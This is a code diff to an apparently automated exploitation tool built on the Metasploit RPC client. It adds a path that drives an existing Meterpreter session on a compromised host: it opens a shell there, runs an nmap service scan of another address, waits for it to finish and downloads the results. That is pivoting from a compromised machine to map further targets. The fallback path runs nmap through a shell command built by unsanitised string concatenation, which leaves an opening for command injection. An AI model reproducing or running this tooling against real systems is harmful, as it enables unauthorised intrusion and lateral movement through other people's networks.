@@ -8,7 +8,12 @@ import json
 import autopayload
 import autoexploit
 import sequences
-from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PayloadModule
+from pymetasploit3.msfrpc import (
+    MsfRpcClient,
+    ExploitModule,
+    PayloadModule,
+    MeterpreterSession,
+)
 import time
 from logs import LOG
 import post.postexploit as postexploit
@@ -69,28 +74,48 @@ def show_pwnguin():
 
 
 # TODO : Changer le exit par une exception
-def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
+def scanIp4Vulnerabilities(
+    exploit_path=EXPLOIT_LIST, ip=IP, shell: MeterpreterSession = None
+):
     """Scans IP looking for vulnerabilities and output the
     related exploit list to be parsed (in json)
     """
     if debug == 0:
-        cmd = "./nmap.sh " + ip + " >> /dev/null"
-        msg = "Launching scan over @" + ip + " cmd :" + cmd
-        print("[i] Launching scan over @" + ip + " cmd :" + cmd)
-        LOG(msg, LOGFILE, "log")
-        scan = subprocess.run(cmd, shell=True)
+        if shell:
+            shell.write("shell")
+            time.sleep(1)
+            shell.write(f"nmap -oX './detect.xml' -sV {ip} &")
+            time.sleep(1)
+            s = "1"
+            while s:
+                shell.write("pgrep nmap")
+                time.sleep(1)
+                s = shell.read()
 
-        if "0 hosts up" in Path("./run/detect.xml").read_text():
-            raise Exception("HostIsDown")
-
-        if scan:
-            msg = "Scan over successfully"
-            print("[V] Scan over successfully")
-            LOG(msg, LOGFILE, "log")
+            shell.write(">")
+            time.sleep(1)
+            shell.read()
+            shell.write("download detect.xml ./run/detect.xml")
+            time.sleep(1)
+            shell.read()
         else:
-            LOG("Error 1 : nmap failed.", LOGFILE, "err")
-            print("[X] Error 1 : nmap failed.")
-            return []
+            cmd = "./nmap.sh " + ip + " >> /dev/null"
+            msg = "Launching scan over @" + ip + " cmd :" + cmd
+            print("[i] Launching scan over @" + ip + " cmd :" + cmd)
+            LOG(msg, LOGFILE, "log")
+            scan = subprocess.run(cmd, shell=True)
+
+            if "0 hosts up" in Path("./run/detect.xml").read_text():
+                raise Exception("HostIsDown")
+
+            if scan:
+                msg = "Scan over successfully"
+                print("[V] Scan over successfully")
+                LOG(msg, LOGFILE, "log")
+            else:
+                LOG("Error 1 : nmap failed.", LOGFILE, "err")
+                print("[X] Error 1 : nmap failed.")
+                return []
         cmd = "./explookup.sh  >> /dev/null"
         msg = "Retrieving exploits"
         print("[i] Retrieving exploits")
